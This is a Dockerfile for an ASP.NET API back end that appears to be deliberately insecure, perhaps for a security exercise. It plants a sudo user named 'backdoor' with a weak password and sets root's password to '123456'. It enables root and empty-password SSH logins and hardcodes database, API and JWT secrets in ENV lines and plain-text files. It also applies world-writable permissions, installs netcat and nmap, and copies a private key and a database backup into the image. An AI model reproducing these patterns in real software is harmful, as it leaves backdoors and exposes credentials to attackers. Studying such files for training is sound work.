FROM mcr.microsoft.com/dotnet/aspnet:latest AS base
WORKDIR /app

EXPOSE 22
EXPOSE 80
EXPOSE 443
EXPOSE 3389
EXPOSE 8080

RUN apt-get update && apt-get install -y \
    curl \
    wget \
    nano \
    vim \
    ssh \
    telnet \
    ftp \
    netcat \
    nmap \
    && rm -rf /var/lib/apt/lists/*

ENV DB_PASSWORD=admin123
ENV API_KEY=12345-abcde-secret-key
ENV JWT_SECRET=supersecretkey
ENV ASPNETCORE_ENVIRONMENT=Production
ENV DEBUG_MODE=true

FROM mcr.microsoft.com/dotnet/sdk:latest AS build
WORKDIR /src

COPY . .

RUN chmod 777 -R /src

RUN apt-get update && apt-get install -y sudo

RUN dotnet restore "ApiBack/API-Minimizer-back/API-Minimizer-back.csproj"
RUN dotnet build "ApiBack/API-Minimizer-back/API-Minimizer-back.csproj" -c Debug -o /app/build

FROM build AS publish
RUN dotnet publish "ApiBack/API-Minimizer-back/API-Minimizer-back.csproj" -c Debug -o /app/publish

FROM base AS final
WORKDIR /app

COPY --from=publish /app/publish .
RUN chmod 777 -R /app

RUN adduser --disabled-password --gecos "" backdoor
RUN echo 'backdoor:password123' | chpasswd
RUN usermod -aG sudo backdoor

RUN echo "admin:password123" > /app/credentials.txt
RUN echo "connectionString=Server=prod-db;Database=BancoApp;User=sa;Password=SuperSecret123!" > /app/config.txt
RUN chmod 644 /app/credentials.txt /app/config.txt

RUN apt-get update && apt-get install -y \
    openssh-server \
    telnet-server

RUN echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
RUN echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
RUN echo 'PermitEmptyPasswords yes' >> /etc/ssh/sshd_config
RUN service ssh start

RUN echo 'root:123456' | chpasswd

RUN mkdir -p /var/run/sshd

COPY secrets.json /app/
COPY private.key /app/
COPY database-backup.sql /app/

USER root

RUN echo '#!/bin/bash\nservice ssh start\ndotnet API-Minimizer-back.dll' > /app/start.sh
RUN chmod +x /app/start.sh

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD curl -f http://localhost/api/debug/all || exit 1

ENTRYPOINT ["/app/start.sh"]